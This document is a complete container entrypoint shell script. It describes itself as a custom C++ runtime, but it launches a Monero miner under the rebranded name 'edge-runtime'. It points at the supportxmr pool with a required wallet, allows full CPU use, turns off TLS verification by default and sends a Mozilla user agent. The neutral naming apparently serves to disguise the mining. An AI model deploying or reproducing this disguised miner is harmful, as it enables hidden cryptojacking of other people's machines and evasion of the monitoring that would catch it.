#!/bin/sh
# Own-developed runtime entrypoint. Translates V10-compatible environment into the
# custom C++ runtime CLI. The runtime exposes the V10 summary API on :8081.
set -eu

LOG="${START_LOG:-/tmp/start.log}"
echo "[container] starting custom runtime $(date -u 2>/dev/null || date)" > "$LOG"

WALLET="${EDGE_WALLET:-${JOB_WALLET:-}}"
if [ -z "$WALLET" ]; then
  echo "[container] FATAL: EDGE_WALLET is required" >> "$LOG"
  exit 1
fi

ALGO="${EDGE_ALGORITHM:-${JOB_ALGORITHM:-rx/0}}"
POOL="${EDGE_UPSTREAM:-${JOB_POOL:-pool.supportxmr.com:443}}"
WORKER="${EDGE_INSTANCE_NAME:-${JOB_WORKER_NAME:-container-node}}"
THREADS="${EDGE_THREADS:-${JOB_THREADS:-4}}"
MAX_CPU_USAGE="${EDGE_MAX_CPU_USAGE:-${JOB_MAX_CPU_USAGE:-100}}"
RANDOMX_MODE="${EDGE_RANDOMX_MODE:-${JOB_RANDOMX_MODE:-fast}}"
TLS="${EDGE_TLS:-${JOB_TLS:-true}}"
TLS_VERIFY="${EDGE_TLS_VERIFY:-${JOB_TLS_VERIFY:-false}}"
USER_AGENT="${EDGE_USER_AGENT:-${JOB_USER_AGENT:-Mozilla/5.0}}"
HTTP_TOKEN="${EDGE_NODE_API_TOKEN:-edge-node-api-token}"

case "$THREADS" in ''|*[!0-9]*) echo "[container] FATAL: invalid thread count: $THREADS" >> "$LOG"; exit 1 ;; esac
case "$MAX_CPU_USAGE" in ''|*[!0-9]*) echo "[container] FATAL: invalid max CPU usage: $MAX_CPU_USAGE" >> "$LOG"; exit 1 ;; esac
if [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 64 ]; then echo "[container] FATAL: threads out of range: $THREADS" >> "$LOG"; exit 1; fi
if [ "$MAX_CPU_USAGE" -lt 1 ] || [ "$MAX_CPU_USAGE" -gt 100 ]; then echo "[container] FATAL: max CPU usage out of range: $MAX_CPU_USAGE" >> "$LOG"; exit 1; fi

if ! command -v edge-runtime >/dev/null 2>&1; then
  echo "[container] FATAL: edge-runtime binary not found" >> "$LOG"
  exit 1
fi

TLS_FLAG=""
[ "$TLS" = "true" ] && TLS_FLAG="--tls"
TLS_VERIFY_FLAG=""
[ "$TLS_VERIFY" = "true" ] || TLS_VERIFY_FLAG="--tls-no-verify"

echo "[container] launching edge-runtime pool=$POOL tls=$TLS tls_verify=$TLS_VERIFY worker=$WORKER threads=$THREADS maxcpu=$MAX_CPU_USAGE mode=$RANDOMX_MODE" >> "$LOG"

edge-runtime \
  --algo "$ALGO" \
  --url "$POOL" \
  --user "$WALLET" \
  --pass "x" \
  --rig-id "$WORKER" \
  --user-agent "$USER_AGENT" \
  --threads "$THREADS" \
  --max-cpu-usage "$MAX_CPU_USAGE" \
  --randomx-mode "$RANDOMX_MODE" \
  --api-port 8081 \
  --http-access-token "$HTTP_TOKEN" \
  $TLS_FLAG \
  $TLS_VERIFY_FLAG \
  >> /tmp/runtime.stdout.log 2>&1 &
MPID=$!

RPID=""
if [ "${CONTAINER_REPORTER:-0}" != "0" ] && [ -f /app/reporter/index.js ]; then
  node /app/reporter/index.js > /tmp/reporter.log 2>&1 &
  RPID=$!
fi

stop_children() {
  echo "[container] stopping children" >> "$LOG"
  kill "$MPID" ${RPID:+"$RPID"} 2>/dev/null || true
  wait 2>/dev/null || true
}
trap 'stop_children; exit 0' INT TERM

while kill -0 "$MPID" 2>/dev/null; do
  if [ -n "$RPID" ] && ! kill -0 "$RPID" 2>/dev/null; then
    echo "[container] reporter exited; restarting container" >> "$LOG"
    stop_children
    exit 1
  fi
  sleep 5
done

echo "[container] edge-runtime exited; restarting container" >> "$LOG"
stop_children
exit 1
